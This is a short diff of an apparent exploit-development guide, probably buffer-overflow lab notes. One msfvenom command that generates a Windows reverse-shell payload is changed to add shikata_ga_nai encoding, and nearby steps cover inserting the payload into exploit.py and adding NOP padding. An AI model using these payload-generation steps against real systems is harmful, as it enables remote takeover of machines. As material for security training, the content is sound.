@@ -67,7 +67,7 @@ _Note: don't include sequential characters_
 
 ## Generate Payload and NOPs
 * Create a payload with msfvenom:
-```msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1\xa2\xa3\xa4" -f py```
+```msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1\xa2\xa3\xa4" -e x86/shikata_ga_nai -f py```
 * Update payload of exploit.py with 'buf' variable definition and set payload = buf
 * Set padding variable to 16 NOP bytes:
 ```padding = "\x90" * 16```
